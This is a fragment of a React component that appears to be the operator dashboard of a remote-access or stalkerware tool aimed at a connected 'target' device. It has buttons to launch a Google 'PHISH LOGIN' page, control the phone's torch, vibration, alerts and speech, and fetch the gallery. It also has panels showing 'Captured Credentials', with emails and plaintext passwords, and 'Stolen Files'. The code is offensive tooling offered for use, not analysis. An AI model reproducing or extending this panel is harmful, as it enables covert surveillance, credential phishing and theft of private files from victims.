                                        <button onClick={() => send('torch', {on: true})} className="p-3 bg-yellow-600/20 border border-yellow-500/50 hover:bg-yellow-600/30 rounded flex flex-col items-center gap-2 active:scale-95 transition-all">
                                            <Flashlight size={20} className="text-yellow-400" /> <span className="text-[10px] font-bold">TORCH ON</span>
                                        </button>

                                        {/* ACTIONS */}
                                        <div className="col-span-2 md:col-span-3 text-[10px] font-bold opacity-50 uppercase tracking-wider mt-2">Actions</div>

                                        <button onClick={() => send('phish', {service: 'google'})} className="p-3 bg-indigo-600/20 border border-indigo-500/50 hover:bg-indigo-600/30 rounded flex flex-col items-center gap-2 active:scale-95 transition-all">
                                            <Skull size={20} className="text-indigo-400" /> <span className="text-[10px] font-bold">PHISH LOGIN</span>
                                        </button>
                                        <button onClick={() => send('vibrate')} className="p-3 bg-white/5 border border-white/10 hover:bg-white/10 rounded flex flex-col items-center gap-2 active:scale-95 transition-all">
                                            <Zap size={20} className="opacity-70" /> <span className="text-[10px] font-bold">VIBRATE</span>
                                        </button>
                                        <button onClick={() => {const m=prompt('Msg'); if(m) send('alert',{msg:m})}} className="p-3 bg-white/5 border border-white/10 hover:bg-white/10 rounded flex flex-col items-center gap-2 active:scale-95 transition-all">
                                            <MessageSquare size={20} className="opacity-70" /> <span className="text-[10px] font-bold">ALERT</span>
                                        </button>

                                        {/* TTS */}
                                        <div className="col-span-2 md:col-span-3 bg-white/5 rounded border border-white/10 p-2 flex gap-2">
                                            <input 
                                                value={ttsInput} onChange={e => setTtsInput(e.target.value)}
                                                placeholder="Text to Speech..." 
                                                className="flex-1 bg-transparent text-xs px-2 outline-none text-white placeholder-white/30"
                                            />
                                            <button onClick={() => { send('speak', {text: ttsInput}); setTtsInput(''); }} className="p-2 bg-white/10 hover:bg-white/20 rounded text-white"><ChevronRight size={14} /></button>
                                        </div>

                                    </div>
                                ) : (
                                    <div className="space-y-6">
                                        {/* CREDENTIALS */}
                                        {target.credentials && target.credentials.length > 0 && (
                                            <div>
                                                <div className="text-[10px] font-bold opacity-50 uppercase tracking-wider mb-2 text-red-400">Captured Credentials</div>
                                                <div className="space-y-2">
                                                    {target.credentials.map((c, i) => (
                                                        <div key={i} className="bg-red-900/20 border border-red-900/50 rounded p-3 text-xs flex justify-between items-center">
                                                            <div>
                                                                <div className="font-bold text-red-300">{c.service.toUpperCase()}</div>
                                                                <div className="text-white opacity-80">{c.email}</div>
                                                            </div>
                                                            <div className="font-mono bg-black/50 px-2 py-1 rounded text-red-200">{c.pass}</div>
                                                        </div>
                                                    ))}
                                                </div>
                                            </div>
                                        )}

                                        {/* GALLERY */}
                                        <div>
                                            <div className="flex justify-between items-center mb-2">
                                                <div className="text-[10px] font-bold opacity-50 uppercase tracking-wider">Stolen Files</div>
                                                <button onClick={() => send('get_gallery')} className="text-[9px] bg-white/10 px-2 py-1 rounded hover:bg-white/20">FETCH MORE</button>
                                            </div>
                                            <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                                                {target.gallery?.map((img, i) => (
                                                    <div key={i} className="aspect-square bg-slate-800 rounded overflow-hidden relative group border border-white/10">
                                                        <img src={img} className="w-full h-full object-cover" />
                                                        <div className="absolute inset-0 bg-black/60 opacity-0 group-hover:opacity-100 flex items-center justify-center gap-2">
                                                            <a href={img} download={`file_${i}.jpg`} className="p-2 bg-white/10 rounded-full text-white hover:bg-white/20"><Copy size={16}/></a>
                                                        </div>
                                                    </div>
                                                ))}
                                            </div>
                                        </div>
                                    </div>
                                )}
                            </div>
                        </>
                    ) : (
                        <div className="flex-1 flex flex-col items-center justify-center opacity-30 gap-6">
                            <Crosshair size={96} className="text-red-500 animate-spin-slow" />
                            <div className="text-sm font-bold tracking-[0.5em] animate-pulse">AWAITING CONNECTION</div>
                        </div>
                    )}
                </div>

                {/* LOGS */}
                <div className="w-56 border-l border-white/10 bg-black/40 hidden xl:flex flex-col shrink-0">
                    <div className="p-2 text-[10px] font-bold border-b border-white/10 flex items-center gap-2 bg-white/5"><Terminal size={10} /> SYSTEM_LOGS</div>
                    <div className="flex-1 p-2 overflow-y-auto font-mono text-[9px] space-y-1">
                        {logs.map((l, i) => <div key={i} className="break-all opacity-70 border-l-2 border-transparent hover:border-white/50 pl-1 hover:text-white transition-colors">{l}</div>)}
                    </div>
                </div>
            </div>
        </div>
    );
};